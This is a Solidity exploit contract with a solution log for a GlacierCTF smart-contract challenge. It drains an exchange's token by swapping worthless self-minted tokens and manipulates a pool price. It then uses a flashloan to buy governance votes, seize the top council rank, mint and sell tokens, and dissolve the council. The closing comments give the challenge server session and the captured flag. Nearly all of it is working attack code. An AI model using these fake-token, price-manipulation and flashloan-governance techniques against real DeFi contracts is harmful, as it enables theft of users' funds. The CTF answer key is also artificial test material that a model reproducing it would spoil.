// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";
import "forge-std/console.sol";

contract fakeToken is ERC20 {
    constructor() ERC20("fakeToken", "FAKE") {
        _mint(msg.sender, 100_000_000);
    }
}

contract Exploit {
    Setup public setup;
    IcyExchange public exchange;
    IERC20 public monkeyToken;
    IERC20 public djungleCoin;
    IERC20 public icyToken;
    CouncilOfApes public council;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        exchange = IcyExchange(setup.TARGET());
        monkeyToken = IERC20(setup.monkeyToken());
        djungleCoin = IERC20(setup.djungleCoin());
        icyToken = IERC20(exchange.icyToken());
        council = CouncilOfApes(exchange.council());
    }

    function solve() public payable {
        require(msg.value == 2 ether, "msg.value != 2 ether");
        council.becomeAnApe(keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing"));

        // steal ~100000 icytoken, by swapping a worthless token to icytoken
        IERC20 fakeToken1 = new fakeToken();
        fakeToken1.approve(address(exchange), type(uint256).max);
        exchange.createPool{value: 1 ether}(address(fakeToken1));

        fakeToken1.approve(address(exchange.getPool(address(fakeToken1))), type(uint256).max);
        exchange.swap(address(fakeToken1), address(icyToken), 100_000);

        // price manipulation with stolen icytoken
        IERC20 fakeToken2 = new fakeToken();
        fakeToken2.approve(address(exchange), type(uint256).max);
        exchange.createPool{value: 1 ether}(address(fakeToken2));

        icyToken.approve(address(exchange.getPool(address(fakeToken2))), type(uint256).max);
        fakeToken2.approve(address(exchange.getPool(address(fakeToken2))), type(uint256).max);
        exchange.swap(address(fakeToken2), address(icyToken), 100_000);
        console.log("getTokensPerIcyToken(1_000_000_000) :", IcyPool(exchange.getPool(address(fakeToken2))).getTokensPerIcyToken(1_000_000_000));

        exchange.collateralizedFlashloan(address(fakeToken2), 1_000_000_000, address(this));
    }

    function receiveFlashLoan(uint256 amount) public {
        console.log("icyToken balance during flashloan :", icyToken.balanceOf(address(this)));
        // become gorilla
        icyToken.approve(address(council), type(uint256).max);
        council.buyBanana(1_000_000_000);
        council.vote(address(this), 1_000_000_000);
        council.claimNewRank();
        console.log("icyToken balance after claiming gorilla rank :", icyToken.balanceOf(address(this)));

        // issue bananas to ourselves as we are gorilla, then sell the bananas for icyTokens to return the flashloan
        council.issueBanana(1_000_000_000, address(this));
        council.sellBanana(1_000_000_000);
        console.log("icyToken balance issued and sold bananas :", icyToken.balanceOf(address(this)));

        // dissolve the council
        council.dissolveCouncilOfTheApes(keccak256("Kevin come out of the basement, dinner is ready."));

        // approve exchange to take back flashloan
        icyToken.approve(address(exchange), type(uint256).max);
    }
}

// # nc chall.glacierctf.com 13380
// 1 - launch new instance
// 2 - kill instance
// 3 - get flag
// action? 3
// ticket please: 141298248353                                                    
// gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}

